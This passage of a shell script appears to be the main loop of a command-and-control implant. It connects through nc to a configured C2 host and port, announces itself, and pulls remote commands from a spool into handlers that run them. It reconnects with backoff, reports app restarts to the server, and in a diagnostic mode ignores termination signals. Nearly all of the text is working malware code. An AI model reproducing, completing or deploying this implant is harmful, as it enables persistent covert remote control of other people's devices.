    # The diag is a one-shot probe: if the widget/engine teardown signals the
    # process group, log it and keep going.  The watchdog's SIGKILL (or the
    # diag's own bounded waits) is the only stop.
    trap 'printf "stage=exit rc=%s line=%s\n" "$?" "${LINENO:-?}" >> "$D/diag.trace"' 0
    if ( trap ':' ERR ) 2>/dev/null; then
        trap 'printf "stage=err rc=%s line=%s\n" "$?" "${LINENO:-?}" >> "$D/diag.trace"' ERR
    fi
    trap 'printf "stage=sig HUP (ignored)\n" >> "$D/diag.trace"' HUP
    trap 'printf "stage=sig TERM (ignored)\n" >> "$D/diag.trace"' TERM
    trap 'printf "stage=sig INT (ignored)\n" >> "$D/diag.trace"' INT
    if [ "${C2_DIAG_X:-0}" = "1" ]; then
        # optional full xtrace; contains the token, keep the file app-private
        exec 2>>"$D/diag.trace"
        set -x
    fi
    diag_run
    exit $?
fi

trap 'cleanup_exit' TERM INT HUP
# Take the lock before publishing a PID: a duplicate that loses the race must
# not overwrite the live implant's pid file.
if ! implant_lock; then
    log "ALREADY_RUNNING pid=$$ lock=$(cat "$LOCK/pid" 2>/dev/null)"
    exit 0
fi
printf '%s\n' "$$" > "$PIDF" 2>/dev/null
rm -f "$STOP" 2>/dev/null
hb
log "START version=$VERSION build=$C2_BUILD id=$C2_ID host=$C2_HOST port=$C2_PORT uid=$UID_STR mock=$MOCK dir=$D"

while :; do
    if [ -f "$STOP" ]; then
        log "STOP file"
        close_conn
        exit 0
    fi

    if [ "$CONNECTED" != "1" ]; then
        if connect; then
            if send_hello; then
                LAST_RX=$(now)
                BACKOFF=1
                log "CONNECTED"
            else
                log "HELLO_SEND_FAIL"
                close_conn
                continue
            fi
        else
            log "CONNECT_FAIL backoff=$BACKOFF"
            $SLEEP "$BACKOFF"
            BACKOFF=$((BACKOFF * 2))
            [ "$BACKOFF" -gt 30 ] && BACKOFF=30
            continue
        fi
    fi

    # transport liveness: cat exits when nc's socket side closes; the holder
    # is a long sleep, so its exit also means the session is gone.
    if ! proc_alive "$NCPID" || ! proc_alive "$CATPID"; then
        log "DISCONNECTED"
        close_conn
        continue
    fi

    # supervisor noticed the app PID change: reconnect and re-hello
    if [ -f "$RESTART" ]; then
        newp=$(cat "$RESTART" 2>/dev/null)
        rm -f "$RESTART" 2>/dev/null
        APP_PID="$newp"
        send_line "{\"op\":\"event\",\"kind\":\"app_restart\",\"pid\":\"$(jesc "$newp")\",\"ts\":\"$(now)\"}"
        log "APP_RESTART pid=$newp"
        $SLEEP 0.2
        close_conn
        continue
    fi

    # process everything that arrived since the last pass
    total=$(wc -l < "$CMDQ" 2>/dev/null)
    case "$total" in ''|*[!0-9]*) total=0 ;; esac
    while [ "$LAST_CMD" -lt "$total" ]; do
        LAST_CMD=$((LAST_CMD + 1))
        line=$(sed -n "${LAST_CMD}p" "$CMDQ" 2>/dev/null)
        LAST_RX=$(now)
        [ -n "$line" ] && handle_line "$line"
        [ "$CONNECTED" = "1" ] || break
    done
    rm -f "$D/.chunk" 2>/dev/null

    stream_exec
    hb

    # A dead server does not close toybox nc while its stdin (fd 9) is open.
    # With no ping for RX_TIMEOUT seconds, drop the session and reconnect.
    if [ "$CONNECTED" = "1" ] && [ $(( $(now) - LAST_RX )) -gt "$RX_TIMEOUT" ]; then
        log "RX_TIMEOUT ${RX_TIMEOUT}s"
        close_conn
        continue
    fi

    # keep the command spool bounded, but only when it is fully consumed and
    # ends on a newline (never discard a partial line or unprocessed command)
    csz=$(wc -c < "$CMDQ" 2>/dev/null)
    case "$csz" in ''|*[!0-9]*) csz=0 ;; esac
    if [ "$csz" -gt 1048576 ] && [ "$LAST_CMD" -ge "$(wc -l < "$CMDQ" 2>/dev/null)" ]; then
        if [ "$(tail -c 1 "$CMDQ" 2>/dev/null | wc -l)" -eq 1 ]; then
            : > "$CMDQ"
            LAST_CMD=0
        fi
    fi

    $SLEEP 0.2
done
